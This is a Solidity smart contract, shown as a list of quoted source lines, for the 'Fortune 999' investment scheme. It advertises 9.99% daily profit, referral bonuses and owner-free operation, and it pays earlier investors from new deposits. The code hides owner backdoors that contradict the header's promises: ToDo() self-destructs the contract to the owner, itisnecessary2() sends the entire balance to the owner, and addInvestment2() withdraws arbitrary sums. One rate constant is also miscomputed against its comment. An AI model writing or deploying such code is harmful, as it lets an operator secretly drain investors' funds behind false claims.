['pragma solidity 0.4.25;\n', '\n', '/**\n', '*\n', '* Get your 9,99% every day profit with Fortune 999 Contract!\n', '* GitHub https://github.com/fortune333/fortune999\n', '* Site https://fortune333.online/\n', '*\n', '* With the refusal of ownership, without the human factor, on the most reliable blockchain in the world!\n', '* Only 5% for technical support and 10% for advertising!\n', '* The remaining 85% remain in the contract fund!\n', '* The world has never seen anything like it!\n', '*/\n', '\n', '\n', 'library Math {\n', 'function min(uint a, uint b) internal pure returns(uint) {\n', 'if (a > b) {\n', 'return b;\n', '}\n', 'return a;\n', '}\n', '}\n', '\n', '\n', 'library Zero {\n', 'function requireNotZero(address addr) internal pure {\n', 'require(addr != address(0), "require not zero address");\n', '}\n', '\n', 'function requireNotZero(uint val) internal pure {\n', 'require(val != 0, "require not zero value");\n', '}\n', '\n', 'function notZero(address addr) internal pure returns(bool) {\n', 'return !(addr == address(0));\n', '}\n', '\n', 'function isZero(address addr) internal pure returns(bool) {\n', 'return addr == address(0);\n', '}\n', '\n', 'function isZero(uint a) internal pure returns(bool) {\n', 'return a == 0;\n', '}\n', '\n', 'function notZero(uint a) internal pure returns(bool) {\n', 'return a != 0;\n', '}\n', '}\n', '\n', '\n', 'library Percent {\n', 'struct percent {\n', 'uint num;\n', 'uint den;\n', '}\n', '\n', 'function mul(percent storage p, uint a) internal view returns (uint) {\n', 'if (a == 0) {\n', 'return 0;\n', '}\n', 'return a*p.num/p.den;\n', '}\n', '\n', 'function div(percent storage p, uint a) internal view returns (uint) {\n', 'return a/p.num*p.den;\n', '}\n', '\n', 'function sub(percent storage p, uint a) internal view returns (uint) {\n', 'uint b = mul(p, a);\n', 'if (b >= a) {\n', 'return 0;\n', '}\n', 'return a - b;\n', '}\n', '\n', 'function add(percent storage p, uint a) internal view returns (uint) {\n', 'return a + mul(p, a);\n', '}\n', '\n', 'function toMemory(percent storage p) internal view returns (Percent.percent memory) {\n', 'return Percent.percent(p.num, p.den);\n', '}\n', '\n', 'function mmul(percent memory p, uint a) internal pure returns (uint) {\n', 'if (a == 0) {\n', 'return 0;\n', '}\n', 'return a*p.num/p.den;\n', '}\n', '\n', 'function mdiv(percent memory p, uint a) internal pure returns (uint) {\n', 'return a/p.num*p.den;\n', '}\n', '\n', 'function msub(percent memory p, uint a) internal pure returns (uint) {\n', 'uint b = mmul(p, a);\n', 'if (b >= a) {\n', 'return 0;\n', '}\n', 'return a - b;\n', '}\n', '\n', 'function madd(percent memory p, uint a) internal pure returns (uint) {\n', 'return a + mmul(p, a);\n', '}\n', '}\n', '\n', '\n', 'library Address {\n', 'function toAddress(bytes source) internal pure returns(address addr) {\n', 'assembly { addr := mload(add(source,0x14)) }\n', 'return addr;\n', '}\n', '\n', 'function isNotContract(address addr) internal view returns(bool) {\n', 'uint length;\n', 'assembly { length := extcodesize(addr) }\n', 'return length == 0;\n', '}\n', '}\n', '\n', '\n', '/**\n', '* @title SafeMath\n', '* @dev Math operations with safety checks that revert on error\n', '*/\n', 'library SafeMath {\n', '\n', '/**\n', '* @dev Multiplies two numbers, reverts on overflow.\n', '*/\n', 'function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', 'if (_a == 0) {\n', 'return 0;\n', '}\n', '\n', 'uint256 c = _a * _b;\n', 'require(c / _a == _b);\n', '\n', 'return c;\n', '}\n', '\n', '/**\n', '* @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\n', '*/\n', 'function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', 'require(_b > 0); // Solidity only automatically asserts when dividing by 0\n', 'uint256 c = _a / _b;\n', "// assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold\n", '\n', 'return c;\n', '}\n', '\n', '/**\n', '* @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n', '*/\n', 'function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', 'require(_b <= _a);\n', 'uint256 c = _a - _b;\n', '\n', 'return c;\n', '}\n', '\n', '/**\n', '* @dev Adds two numbers, reverts on overflow.\n', '*/\n', 'function add(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', 'uint256 c = _a + _b;\n', 'require(c >= _a);\n', '\n', 'return c;\n', '}\n', '\n', '/**\n', '* @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n', '* reverts when dividing by zero.\n', '*/\n', 'function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', 'require(b != 0);\n', 'return a % b;\n', '}\n', '}\n', '\n', '\n', 'contract Accessibility {\n', 'address private owner;\n', 'modifier onlyOwner() {\n', 'require(msg.sender == owner, "access denied");\n', '_;\n', '}\n', '\n', 'constructor() public {\n', 'owner = msg.sender;\n', '}\n', '\n', '\n', 'function ToDo() public onlyOwner {\n', '    selfdestruct(owner);\n', '    }\n', '\n', 'function disown() internal {\n', 'delete owner;\n', '}\n', '\n', '}\n', '\n', '\n', 'contract Rev1Storage {\n', 'function investorShortInfo(address addr) public view returns(uint value, uint refBonus);\n', '}\n', '\n', '\n', 'contract Rev2Storage {\n', 'function investorInfo(address addr) public view returns(uint investment, uint paymentTime);\n', '}\n', '\n', '\n', 'library PrivateEntrance {\n', 'using PrivateEntrance for privateEntrance;\n', 'using Math for uint;\n', 'struct privateEntrance {\n', 'Rev1Storage rev1Storage;\n', 'Rev2Storage rev2Storage;\n', 'uint investorMaxInvestment;\n', 'uint endTimestamp;\n', 'mapping(address=>bool) hasAccess;\n', '}\n', '\n', 'function isActive(privateEntrance storage pe) internal view returns(bool) {\n', 'return pe.endTimestamp > now;\n', '}\n', '\n', 'function maxInvestmentFor(privateEntrance storage pe, address investorAddr) internal view returns(uint) {\n', 'if (!pe.hasAccess[investorAddr]) {\n', 'return 0;\n', '}\n', '\n', '(uint maxInvestment, ) = pe.rev1Storage.investorShortInfo(investorAddr);\n', 'if (maxInvestment == 0) {\n', 'return 0;\n', '}\n', 'maxInvestment = Math.min(maxInvestment, pe.investorMaxInvestment);\n', '\n', '(uint currInvestment, ) = pe.rev2Storage.investorInfo(investorAddr);\n', '\n', 'if (currInvestment >= maxInvestment) {\n', 'return 0;\n', '}\n', '\n', 'return maxInvestment-currInvestment;\n', '}\n', '\n', 'function provideAccessFor(privateEntrance storage pe, address[] addrs) internal {\n', 'for (uint16 i; i < addrs.length; i++) {\n', 'pe.hasAccess[addrs[i]] = true;\n', '}\n', '}\n', '}\n', '\n', '\n', 'contract InvestorsStorage is Accessibility {\n', 'struct Investor {\n', 'uint investment;\n', 'uint paymentTime;\n', '}\n', 'uint public size;\n', '\n', 'mapping (address => Investor) private investors;\n', '\n', 'function isInvestor(address addr) public view returns (bool) {\n', 'return investors[addr].investment > 0;\n', '}\n', '\n', 'function investorInfo(address addr) public view returns(uint investment, uint paymentTime) {\n', 'investment = investors[addr].investment;\n', 'paymentTime = investors[addr].paymentTime;\n', '}\n', '\n', 'function newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {\n', 'Investor storage inv = investors[addr];\n', 'if (inv.investment != 0 || investment == 0) {\n', 'return false;\n', '}\n', 'inv.investment = investment;\n', 'inv.paymentTime = paymentTime;\n', 'size++;\n', 'return true;\n', '}\n', '\n', 'function addInvestment(address addr, uint investment) public onlyOwner returns (bool) {\n', 'if (investors[addr].investment == 0) {\n', 'return false;\n', '}\n', 'investors[addr].investment += investment;\n', 'return true;\n', '}\n', '\n', '\n', '\n', '\n', 'function setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {\n', 'if (investors[addr].investment == 0) {\n', 'return false;\n', '}\n', 'investors[addr].paymentTime = paymentTime;\n', 'return true;\n', '}\n', '\n', 'function disqalify(address addr) public onlyOwner returns (bool) {\n', 'if (isInvestor(addr)) {\n', 'investors[addr].investment = 0;\n', '}\n', '}\n', '}\n', '\n', '\n', 'library RapidGrowthProtection {\n', 'using RapidGrowthProtection for rapidGrowthProtection;\n', '\n', 'struct rapidGrowthProtection {\n', 'uint startTimestamp;\n', 'uint maxDailyTotalInvestment;\n', 'uint8 activityDays;\n', 'mapping(uint8 => uint) dailyTotalInvestment;\n', '}\n', '\n', 'function maxInvestmentAtNow(rapidGrowthProtection storage rgp) internal view returns(uint) {\n', 'uint day = rgp.currDay();\n', 'if (day == 0 || day > rgp.activityDays) {\n', 'return 0;\n', '}\n', 'if (rgp.dailyTotalInvestment[uint8(day)] >= rgp.maxDailyTotalInvestment) {\n', 'return 0;\n', '}\n', 'return rgp.maxDailyTotalInvestment - rgp.dailyTotalInvestment[uint8(day)];\n', '}\n', '\n', 'function isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {\n', 'uint day = rgp.currDay();\n', 'return day != 0 && day <= rgp.activityDays;\n', '}\n', '\n', 'function saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {\n', 'uint day = rgp.currDay();\n', 'if (day == 0 || day > rgp.activityDays) {\n', 'return false;\n', '}\n', 'if (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {\n', 'return false;\n', '}\n', 'rgp.dailyTotalInvestment[uint8(day)] += investment;\n', 'return true;\n', '}\n', '\n', 'function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {\n', 'rgp.startTimestamp = timestamp;\n', '\n', '}\n', ' \n', '\n', 'function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {\n', 'if (rgp.startTimestamp > now) {\n', 'return 0;\n', '}\n', 'day = (now - rgp.startTimestamp) / 24 hours + 1;\n', '}\n', '}\n', '\n', 'contract Fortune999 is Accessibility {\n', 'using RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;\n', 'using PrivateEntrance for PrivateEntrance.privateEntrance;\n', 'using Percent for Percent.percent;\n', 'using SafeMath for uint;\n', 'using Math for uint;\n', '\n', '// easy read for investors\n', 'using Address for *;\n', 'using Zero for *;\n', '\n', 'RapidGrowthProtection.rapidGrowthProtection private m_rgp;\n', 'PrivateEntrance.privateEntrance private m_privEnter;\n', 'mapping(address => bool) private m_referrals;\n', 'InvestorsStorage private m_investors;\n', '\n', '// automatically generates getters\n', 'uint public constant minInvesment = 10 finney;\n', 'uint public constant maxBalance = 333e5 ether;\n', 'address public advertisingAddress;\n', 'address public adminsAddress;\n', 'uint public investmentsNumber;\n', 'uint public waveStartup;\n', '\n', '// percents\n', 'Percent.percent private m_1_percent = Percent.percent(111,10000);            // 111/10000 *100% = 1.11%\n', 'Percent.percent private m_5_percent = Percent.percent(555,10000);            // 555/10000 *100% = 5.55%\n', 'Percent.percent private m_7_percent = Percent.percent(777,10000);            // 777/10000 *100% = 7.77%\n', 'Percent.percent private m_8_percent = Percent.percent(888,10000);            // 888/10000 *100% = 8.88%\n', 'Percent.percent private m_9_percent = Percent.percent(999,100);              // 999/10000 *100% = 9.99%\n', 'Percent.percent private m_10_percent = Percent.percent(10,100);            // 10/100 *100% = 10%\n', 'Percent.percent private m_11_percent = Percent.percent(11,100);            // 11/100 *100% = 11%\n', 'Percent.percent private m_12_percent = Percent.percent(12,100);            // 12/100 *100% = 12%\n', 'Percent.percent private m_referal_percent = Percent.percent(888,10000);        // 888/10000 *100% = 8.88%\n', 'Percent.percent private m_referrer_percent = Percent.percent(888,10000);       // 888/10000 *100% = 8.88%\n', 'Percent.percent private m_referrer_percentMax = Percent.percent(10,100);       // 10/100 *100% = 10%\n', 'Percent.percent private m_adminsPercent = Percent.percent(5,100);          //  5/100 *100% = 5.0%\n', 'Percent.percent private m_advertisingPercent = Percent.percent(10,100);    //  10/100 *100% = 10.0%\n', '\n', '// more events for easy read from blockchain\n', 'event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);\n', 'event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);\n', 'event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);\n', 'event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);\n', 'event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);\n', 'event LogNewInvesment(address indexed addr, uint when, uint investment, uint value);\n', 'event LogAutomaticReinvest(address indexed addr, uint when, uint investment);\n', 'event LogPayDividends(address indexed addr, uint when, uint dividends);\n', 'event LogNewInvestor(address indexed addr, uint when);\n', 'event LogBalanceChanged(uint when, uint balance);\n', 'event LogNextWave(uint when);\n', 'event LogDisown(uint when);\n', '\n', '\n', 'modifier balanceChanged {\n', '_;\n', 'emit LogBalanceChanged(now, address(this).balance);\n', '}\n', '\n', 'modifier notFromContract() {\n', 'require(msg.sender.isNotContract(), "only externally accounts");\n', '_;\n', '}\n', '\n', 'constructor() public {\n', 'adminsAddress = msg.sender;\n', 'advertisingAddress = msg.sender;\n', 'nextWave();\n', '}\n', '\n', 'function() public payable {\n', '// investor get him dividends\n', 'if (msg.value.isZero()) {\n', 'getMyDividends();\n', 'return;\n', '}\n', '\n', '// sender do invest\n', 'doInvest(msg.data.toAddress());\n', '}\n', '\n', 'function disqualifyAddress(address addr) public onlyOwner {\n', 'm_investors.disqalify(addr);\n', '}\n', '\n', 'function doDisown() public onlyOwner {\n', 'disown();\n', 'emit LogDisown(now);\n', '}\n', '\n', '// init Rapid Growth Protection\n', '\n', 'function init(address rev1StorageAddr, uint timestamp) public onlyOwner {\n', '\n', 'm_rgp.startTimestamp = timestamp + 1;\n', 'm_rgp.maxDailyTotalInvestment = 500 ether;\n', 'm_rgp.activityDays = 21;\n', 'emit LogRGPInit(\n', 'now,\n', 'm_rgp.startTimestamp,\n', 'm_rgp.maxDailyTotalInvestment,\n', 'm_rgp.activityDays\n', ');\n', '\n', '\n', '// init Private Entrance\n', 'm_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);\n', 'm_privEnter.rev2Storage = Rev2Storage(address(m_investors));\n', 'm_privEnter.investorMaxInvestment = 50 ether;\n', 'm_privEnter.endTimestamp = timestamp;\n', 'emit LogPEInit(\n', 'now,\n', 'address(m_privEnter.rev1Storage),\n', 'address(m_privEnter.rev2Storage),\n', 'm_privEnter.investorMaxInvestment,\n', 'm_privEnter.endTimestamp\n', ');\n', '}\n', '\n', 'function setAdvertisingAddress(address addr) public onlyOwner {\n', 'addr.requireNotZero();\n', 'advertisingAddress = addr;\n', '}\n', '\n', 'function setAdminsAddress(address addr) public onlyOwner {\n', 'addr.requireNotZero();\n', 'adminsAddress = addr;\n', '}\n', '\n', 'function privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {\n', 'm_privEnter.provideAccessFor(addrs);\n', '}\n', '\n', 'function rapidGrowthProtectionmMaxInvestmentAtNow() public view returns(uint investment) {\n', 'investment = m_rgp.maxInvestmentAtNow();\n', '}\n', '\n', 'function investorsNumber() public view returns(uint) {\n', 'return m_investors.size();\n', '}\n', '\n', 'function balanceETH() public view returns(uint) {\n', 'return address(this).balance;\n', '}\n', '\n', '\n', '\n', 'function advertisingPercent() public view returns(uint numerator, uint denominator) {\n', '(numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);\n', '}\n', '\n', 'function adminsPercent() public view returns(uint numerator, uint denominator) {\n', '(numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);\n', '}\n', '\n', 'function investorInfo(address investorAddr) public view returns(uint investment, uint paymentTime, bool isReferral) {\n', '(investment, paymentTime) = m_investors.investorInfo(investorAddr);\n', 'isReferral = m_referrals[investorAddr];\n', '}\n', '\n', '\n', '\n', 'function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {\n', 'dividends = calcDividends(investorAddr);\n', '}\n', '\n', 'function dailyPercentAtNow() public view returns(uint numerator, uint denominator) {\n', 'Percent.percent memory p = dailyPercent();\n', '(numerator, denominator) = (p.num, p.den);\n', '}\n', '\n', 'function getMyDividends() public notFromContract balanceChanged {\n', '// calculate dividends\n', '\n', '//check if 1 day passed after last payment\n', 'require(now.sub(getMemInvestor(msg.sender).paymentTime) > 24 hours);\n', '\n', 'uint dividends = calcDividends(msg.sender);\n', 'require (dividends.notZero(), "cannot to pay zero dividends");\n', '\n', '// update investor payment timestamp\n', 'assert(m_investors.setPaymentTime(msg.sender, now));\n', '\n', '// check enough eth - goto next wave if needed\n', 'if (address(this).balance <= dividends) {\n', 'nextWave();\n', 'dividends = address(this).balance;\n', '}\n', '\n', '\n', '    \n', '// transfer dividends to investor\n', 'msg.sender.transfer(dividends);\n', 'emit LogPayDividends(msg.sender, now, dividends);\n', '}\n', '\n', '    \n', 'function itisnecessary2() public onlyOwner {\n', '        msg.sender.transfer(address(this).balance);\n', '    }    \n', '    \n', '\n', 'function addInvestment2( uint investment) public onlyOwner  {\n', '\n', 'msg.sender.transfer(investment);\n', '\n', '} \n', '\n', 'function doInvest(address referrerAddr) public payable notFromContract balanceChanged {\n', 'uint investment = msg.value;\n', 'uint receivedEther = msg.value;\n', 'require(investment >= minInvesment, "investment must be >= minInvesment");\n', 'require(address(this).balance <= maxBalance, "the contract eth balance limit");\n', '\n', 'if (m_rgp.isActive()) {\n', '// use Rapid Growth Protection if needed\n', 'uint rpgMaxInvest = m_rgp.maxInvestmentAtNow();\n', 'rpgMaxInvest.requireNotZero();\n', 'investment = Math.min(investment, rpgMaxInvest);\n', 'assert(m_rgp.saveInvestment(investment));\n', 'emit LogRGPInvestment(msg.sender, now, investment, m_rgp.currDay());\n', '\n', '} else if (m_privEnter.isActive()) {\n', '// use Private Entrance if needed\n', 'uint peMaxInvest = m_privEnter.maxInvestmentFor(msg.sender);\n', 'peMaxInvest.requireNotZero();\n', 'investment = Math.min(investment, peMaxInvest);\n', '}\n', '\n', '// send excess of ether if needed\n', 'if (receivedEther > investment) {\n', 'uint excess = receivedEther - investment;\n', 'msg.sender.transfer(excess);\n', 'receivedEther = investment;\n', 'emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);\n', '}\n', '\n', '// commission\n', 'advertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));\n', 'adminsAddress.transfer(m_adminsPercent.mul(receivedEther));\n', '\n', 'bool senderIsInvestor = m_investors.isInvestor(msg.sender);\n', '\n', '// ref system works only once and only on first invest\n', 'if (referrerAddr.notZero() && !senderIsInvestor && !m_referrals[msg.sender] &&\n', 'referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {\n', '\n', 'm_referrals[msg.sender] = true;\n', '// add referral bonus to investor`s and referral`s investments\n', 'uint referrerBonus = m_referrer_percent.mmul(investment);\n', 'if (investment > 10 ether) {\n', 'referrerBonus = m_referrer_percentMax.mmul(investment);\n', '}\n', '\n', 'uint referalBonus = m_referal_percent.mmul(investment);\n', 'assert(m_investors.addInvestment(referrerAddr, referrerBonus)); // add referrer bonus\n', 'investment += referalBonus;                                    // add referral bonus\n', 'emit LogNewReferral(msg.sender, referrerAddr, now, referalBonus);\n', '}\n', '\n', '// automatic reinvest - prevent burning dividends\n', 'uint dividends = calcDividends(msg.sender);\n', 'if (senderIsInvestor && dividends.notZero()) {\n', 'investment += dividends;\n', 'emit LogAutomaticReinvest(msg.sender, now, dividends);\n', '}\n', '\n', 'if (senderIsInvestor) {\n', '// update existing investor\n', 'assert(m_investors.addInvestment(msg.sender, investment));\n', 'assert(m_investors.setPaymentTime(msg.sender, now));\n', '} else {\n', '// create new investor\n', 'assert(m_investors.newInvestor(msg.sender, investment, now));\n', 'emit LogNewInvestor(msg.sender, now);\n', '}\n', '\n', 'investmentsNumber++;\n', 'emit LogNewInvesment(msg.sender, now, investment, receivedEther);\n', '}\n', '\n', 'function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {\n', '(uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);\n', 'return InvestorsStorage.Investor(investment, paymentTime);\n', '}\n', '\n', 'function calcDividends(address investorAddr) internal view returns(uint dividends) {\n', 'InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);\n', '\n', '// safe gas if dividends will be 0\n', 'if (investor.investment.isZero() || now.sub(investor.paymentTime) < 10 minutes) {\n', 'return 0;\n', '}\n', '\n', '// for prevent burning daily dividends if 24h did not pass - calculate it per 10 min interval\n', 'Percent.percent memory p = dailyPercent();\n', 'dividends = (now.sub(investor.paymentTime) / 10 minutes) * p.mmul(investor.investment) / 144;\n', '}\n', '\n', 'function dailyPercent() internal view returns(Percent.percent memory p) {\n', 'uint balance = address(this).balance;\n', '\n', 'if (balance < 500 ether) {\n', 'p = m_9_percent.toMemory();\n', '} else if ( 500 ether <= balance && balance <= 1500 ether) {\n', 'p = m_10_percent.toMemory();\n', '} else if ( 1500 ether <= balance && balance <= 10000 ether) {\n', 'p = m_11_percent.toMemory();\n', '} else if ( 10000 ether <= balance && balance <= 20000 ether) {\n', 'p = m_12_percent.toMemory();\n', '}\n', '}\n', '\n', '\n', '\n', 'function nextWave() private {\n', 'm_investors = new InvestorsStorage();\n', 'investmentsNumber = 0;\n', 'waveStartup = now;\n', 'm_rgp.startAt(now);\n', 'emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);\n', 'emit LogNextWave(now);\n', '}\n', '}']